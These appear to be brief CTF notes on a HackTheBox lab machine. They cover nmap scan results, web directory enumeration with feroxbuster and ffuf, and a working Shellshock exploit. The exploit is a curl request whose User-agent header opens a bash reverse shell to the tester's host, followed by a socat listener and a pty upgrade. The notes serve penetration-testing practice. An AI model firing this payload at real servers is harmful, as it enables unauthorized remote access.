# Information gathering

*system Network*
10.10.10.56

*nmap*

```
PORT     STATE SERVICE VERSION                            
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))         
|_http-server-header: Apache/2.4.18 (Ubuntu)               
|_http-title: Site doesn't have a title (text/html).          
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)                             
| ssh-hostkey:                                                 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)       
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)          
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)                                   
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

*directory enum*

```bash
feroxbuster -u http://10.10.10.56 -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt  -u http://10.10.10.56/cgi-bin/FUZZ -e .sh,.cgi,.py,.pl
```

*shell shock*
payload: 

```bash
curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.3/6001 0>&1" http://10.10.10.56/cgi-bin/user.sh
```

listener:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:6001
```

ps. `python3 -c 'import pty; pty.spawn("/bin/sh")'`

*screen shot*

![image-20221220170946256](D:\OSCP\hackthebox\attachments\image-20221220170946256.png)

